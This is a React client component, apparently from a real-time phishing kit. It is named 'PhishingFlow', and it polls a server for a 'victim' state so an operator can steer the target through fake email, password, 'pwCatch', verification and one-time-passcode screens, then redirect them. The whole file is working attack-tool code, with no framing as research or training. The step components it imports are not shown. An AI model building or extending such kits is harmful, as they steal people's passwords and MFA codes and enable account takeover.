"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import EmailStep from "./steps/EmailStep";
import LoginStep from "./steps/LoginStep";
import PasswordStep from "./steps/PasswordStep";
import PwCatchStep from "./steps/PwCatchStep";
import VerifyStep from "./steps/VerifyStep";
import OtpStep from "./steps/OtpStep";
import ErrorStep from "./steps/ErrorStep";
import Redirecting from "./steps/Redirecting";
import { Skeleton } from "@/components/ui/skeleton";

type VictimState = {
  currentPage: string;
  email: string;
  name: string;
  profilePicture: string;
  errorMessage: string;
  redirectUrl: string;
  isTyping: boolean;
};

export default function PhishingFlow() {
  const [state, setState] = useState<VictimState | null>(null);
  const [error, setError] = useState<string | null>(null);
  const isInteracting = useRef(false);
  const intervalId = useRef<NodeJS.Timeout | null>(null);

  const stopPolling = useCallback(() => {
    if (intervalId.current) {
      clearInterval(intervalId.current);
      intervalId.current = null;
    }
  }, []);

  const fetchState = useCallback(async () => {
      if (isInteracting.current) return;
      try {
        const res = await fetch("/api/state?view=victim");
        if (!res.ok) {
          const errorData = await res.json();
          throw new Error(errorData.error || "Failed to fetch state");
        }
        const data: VictimState = await res.json();
        setState(data);
        setError(null);
      } catch (err: any) {
        setError(err.message);
        console.error("Polling error:", err);
      }
    }, []);

  const startPolling = useCallback(() => {
    stopPolling(); 
    fetchState();
    intervalId.current = setInterval(fetchState, 2000);
  }, [stopPolling, fetchState]);


  useEffect(() => {
    startPolling();
    return () => stopPolling();
  }, [startPolling, stopPolling]);

  const handleInteractionStart = () => {
    isInteracting.current = true;
    stopPolling();
  };
  
  const handleInteractionEnd = async (submitAction: () => Promise<void>) => {
    isInteracting.current = true;
    stopPolling();
    
    try {
      await submitAction();
    } finally {
      isInteracting.current = false;
      startPolling();
    }
  };

  if (error) {
    return (
      <div className="w-full text-center text-destructive">
        <h1 className="text-2xl font-semibold">Connection Error</h1>
        <p className="mt-2 text-sm">{error}</p>
        <p className="mt-2 text-sm">Please try refreshing the page.</p>
      </div>
    );
  }

  if (!state) {
    return (
      <div className="space-y-4 w-full">
        <Skeleton className="h-8 w-1/2 mx-auto" />
        <Skeleton className="h-6 w-3/4 mx-auto" />
        <div className="pt-8 space-y-6 w-full">
          <Skeleton className="h-12 w-full" />
          <div className="flex justify-between">
            <Skeleton className="h-10 w-24" />
            <Skeleton className="h-10 w-24" />
          </div>
        </div>
      </div>
    );
  }
  
  const renderStep = () => {
      const interactionProps = {
        onInteractionStart: handleInteractionStart,
        onInteractionEnd: handleInteractionEnd,
      };

      switch (state.currentPage) {
        case 'email':
          return <EmailStep {...interactionProps} />;
        case 'login':
          return <LoginStep {...state} {...interactionProps} />;
        case 'password':
          return <PasswordStep {...state} {...interactionProps} />;
        case 'pwCatch':
          return <PwCatchStep {...state} {...interactionProps} />;
        case 'verify':
          return <VerifyStep {...interactionProps} />;
        case 'otp':
          return <OtpStep {...interactionProps} />;
        case 'error':
            return <ErrorStep errorMessage={state.errorMessage} {...interactionProps} />;
        case 'redirect':
            return <Redirecting url={state.redirectUrl} />;
        default:
          return <EmailStep {...interactionProps} />;
      }
  }

  return renderStep();
}
